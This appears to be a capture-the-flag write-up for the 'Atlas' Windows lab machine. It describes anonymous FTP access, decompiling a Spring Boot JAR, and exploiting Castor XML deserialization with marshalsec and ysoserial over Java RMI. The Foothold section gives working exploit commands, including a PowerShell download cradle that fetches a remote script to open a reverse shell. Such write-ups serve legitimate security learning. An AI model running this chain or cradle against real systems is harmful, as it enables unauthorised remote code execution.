## Overview

Atlas is a hard-difficulty Windows machine. Anonymous FTP exposes the web application's compiled source, which shows a Spring Boot app unmarshalling uploaded XML via the **Castor** library — a textbook Java deserialization sink. Abusing it with `marshalsec` + `ysoserial` over Java RMI yields a shell as `atlas\john`. This post stops at `user.txt`.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 21   | ftp     | FileZilla Server 1.7.2 — anonymous allowed |
| 22   | ssh     | OpenSSH |
| 3389 | ms-wbt  | RDP |
| 8080 | http    | Spring Boot web app |

```bash
nmap -Pn -p- -sV 10.129.238.8
```

Most ports are filtered; FTP and the 8080 web app are the interesting surface.

## Enumeration

### Anonymous FTP

The FTP server allows anonymous login and serves the application's own artifacts:

```bash
ftp anonymous@10.129.238.8
# get atlas-pilot-1.0.0-SNAPSHOT.jar
# get atlas_generator.zip
```

Decompiling the JAR shows a **Spring Boot** app that processes XML to render employee résumé templates. The `/generateTemplate` endpoint (port 8080) writes a sample `employee_template.xml` back into the FTP directory. Critically, the app **unmarshals (deserializes) uploaded XML into Employee objects using Castor** — that is the vulnerable sink.

Checking `pom.xml` confirms the Spring dependency, which tells us the `marshalsec` gadget to use: `SpringAbstractBeanFactoryPointcutAdvisor`.

## Foothold

### Castor XML deserialization → Java RMI RCE

Generate a Castor payload whose JNDI URL points back at our host. The LDAP scheme only proves SSRF on a patched JDK (the server won't fetch the remote class), so we use the **RMI** scheme:

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Castor \
  SpringAbstractBeanFactoryPointcutAdvisor rmi://<lhost>/test
```

Serve the malicious remote object with `ysoserial`'s JRMP listener (a `CommonsBeanutils1` gadget chain). Build ysoserial inside Docker (`maven:3.5-jdk-8` + `openjdk:8-jdk-alpine`) to sidestep local Java dependency issues:

```bash
docker run -it -p 1099:1099 --rm ysoserial -c "bash"
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'ping <lhost>'
```

Paste the marshalsec `<x>...</x>` block into the `<name>` field of the generated `employee_template.xml`, upload it, and the server's Castor unmarshaller performs the RMI lookup → deserializes our gadget → runs the command. An ICMP callback confirms RCE.

Swap the command to a PowerShell download-cradle for a reverse shell:

```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 \
  'powershell iex(iwr <lhost>:2222/rev.ps1 -usebasicp)'
```

Re-upload the template to fire it and catch a shell as `atlas\john`.

## User flag

```bash
type C:\Users\John\Desktop\user.txt   # HTB{...}
```

Access as `atlas\john` achieved.
